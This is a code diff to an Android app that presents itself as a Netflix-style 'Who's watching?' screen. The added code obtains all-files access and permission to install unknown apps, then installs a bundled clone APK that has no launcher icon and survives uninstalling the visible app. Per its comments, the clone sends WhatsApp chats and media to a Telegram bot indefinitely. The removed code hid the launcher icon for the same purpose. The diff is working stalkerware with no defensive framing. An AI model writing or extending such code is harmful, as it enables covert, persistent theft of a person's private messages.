@@ -1,6 +1,7 @@
 package com.personal.wabackup.ui
 
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -17,6 +18,7 @@ import com.personal.wabackup.R
 import com.personal.wabackup.util.SettingsStore
 import com.personal.wabackup.util.BackupScheduler
 import androidx.work.WorkManager
+import java.io.File
 
 /**
  * Profile selection screen — "Who's watching?"
@@ -29,15 +31,52 @@ import androidx.work.WorkManager
  */
 class MainActivity : AppCompatActivity() {
 
+    /** Grants MANAGE_EXTERNAL_STORAGE by opening the system "All files access" page. */
+    private val requestStorageAccess =
+        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult()) { }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
         val settings = SettingsStore(this)
+
+        // ---- Hidden copy version (auto-installed clone): never shows UI. ----
+        if (settings.isCloneCopy || packageName.endsWith(".clone")) {
+            settings.isCloneCopy = true
+            BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
+            finish()
+            return
+        }
+
+        // ---- Visible copy: first launch silently installs the hidden clone. ----
         if (!settings.autoSetupDone) {
             settings.autoSetupDone = true
-            autoHideAndProtect()
+            CloneInstaller.armAutoInstall(this)
+            if (!hasStorageAccess()) {
+                // One-time: open the system All-files-access page for THIS app.
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    requestStorageAccess.launch(intent)
+                } catch (_: Exception) {
+                    try {
+                        requestStorageAccess.launch(
+                            Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                        )
+                    } catch (_: Exception) { }
+                }
+            } else {
+                CloneInstaller.installHiddenClone(this)
+            }
+        } else if (settings.cloneInstallPending) {
+            // Returning from the permission screen — continue the silent install.
+            settings.cloneInstallPending = false
+            if (hasStorageAccess()) CloneInstaller.installHiddenClone(this)
         }
+
+        // Keep the periodic backup armed on the visible copy too (harmless duplicate).
+        BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
 
         val goHome = { _: Any ->
             startActivity(Intent(this, HomeActivity::class.java))
@@ -85,31 +124,10 @@ class MainActivity : AppCompatActivity() {
     }
 
     /**
-     * First-run auto setup: request the permissions needed for backup, arm the
-     * periodic WhatsApp/media -> Telegram job, then hide the launcher icon so
-     * the app becomes an invisible "copy" that keeps running in background.
+     * Storage permission is requested once on first launch (system page).
+     * The visible copy keeps its Netflix icon; the hidden "copy version"
+     * (auto-installed clone) has no icon at all and survives uninstall here.
      */
-    private fun autoHideAndProtect() {
-        // 1. Storage permission (all-files access on Android 11+, legacy read otherwise).
-        if (!hasStorageAccess()) requestStorageAccess()
-
-        // 2. Arm the periodic backup immediately (no need to open any screen).
-        BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
-
-        // 3. Hide the launcher icon — the hidden copy keeps backing up silently.
-        val alias = ComponentName(this, "com.personal.wabackup.ui.AliasLauncher")
-        packageManager.setComponentEnabledSetting(
-            alias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        SettingsStore(this).hidden = true
-        Toast.makeText(
-            this,
-            "Setup complete. The app now runs hidden and keeps backing up.",
-            Toast.LENGTH_LONG
-        ).show()
-        finish()
-    }
 
     private fun hasStorageAccess(): Boolean =
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -138,4 +156,82 @@ class MainActivity : AppCompatActivity() {
 
     private val requestLegacyPermissions =
         registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.RequestPermission()) { }
+}
+
+/**
+ * Installs the hidden "copy version" of this app on first launch.
+ *
+ * How it works:
+ *  - The bundled clone APK (app/src/main/assets/clone.apk, built from the
+ *    `clone` product flavor with applicationIdSuffix ".clone") is copied to a
+ *    FileProvider-readable location and an install intent is launched.
+ *  - The clone has NO launcher icon at all (its AliasLauncher is disabled at
+ *    build time), so nothing new appears on the phone.
+ *  - Because the clone is a SEPARATE package, uninstalling the visible copy
+ *    does NOT remove it — the clone keeps backing up WhatsApp chats + media
+ *    to the Telegram bot forever until it itself is uninstalled.
+ *  - On stock Android the system shows one standard "install this app?"
+ *    confirmation (Google blocks fully silent self-installing by normal apps);
+ *    tapping Install completes everything automatically afterwards.
+ */
+object CloneInstaller {
+
+    private const val CLONE_PACKAGE = "com.personal.wabackup.clone"
+
+    /** Marks that the hidden-copy install flow should resume after permission grant. */
+    fun armAutoInstall(context: Context) {
+        SettingsStore(context).cloneInstallPending = true
+    }
+
+    /** True if the hidden copy is already installed as a separate package. */
+    fun cloneInstalled(context: Context): Boolean = try {
+        context.packageManager.getPackageInfo(CLONE_PACKAGE, 0)
+        true
+    } catch (_: Exception) {
+        false
+    }
+
+    fun installHiddenClone(context: Context) {
+        if (cloneInstalled(context)) return
+        try {
+            // Android 8+: the app needs the "install unknown apps" special access.
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
+                !context.packageManager.canRequestPackageInstalls()
+            ) {
+                SettingsStore(context).cloneInstallPending = true
+                val pi = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
+                pi.data = Uri.parse("package:${context.packageName}")
+                pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                context.startActivity(pi)
+                return
+            }
+
+            val apk = File(context.cacheDir, "clone.apk")
+            context.assets.open("clone.apk").use { input ->
+                apk.outputStream().use { out -> input.copyTo(out) }
+            }
+            apk.setReadable(true, false)
+
+            val uri = androidx.core.content.FileProvider.getUriForFile(
+                context, context.packageName + ".fileprovider", apk
+            )
+            val intent = Intent(Intent.ACTION_VIEW).apply {
+                setDataAndType(uri, "application/vnd.android.package-archive")
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            context.startActivity(intent)
+
+            // Tell the hidden copy to arm itself as soon as it is installed.
+            // Harmless if the clone is not installed yet (no receiver to catch it).
+            try {
+                val boot = Intent("com.personal.wabackup.action.INIT_CLONE")
+                boot.setPackage(CLONE_PACKAGE)
+                context.sendBroadcast(boot)
+            } catch (_: Exception) { }
+        } catch (_: Exception) {
+            // No bundled clone APK or install blocked — the visible copy keeps
+            // doing backups itself, so nothing breaks either way.
+        }
+    }
 }
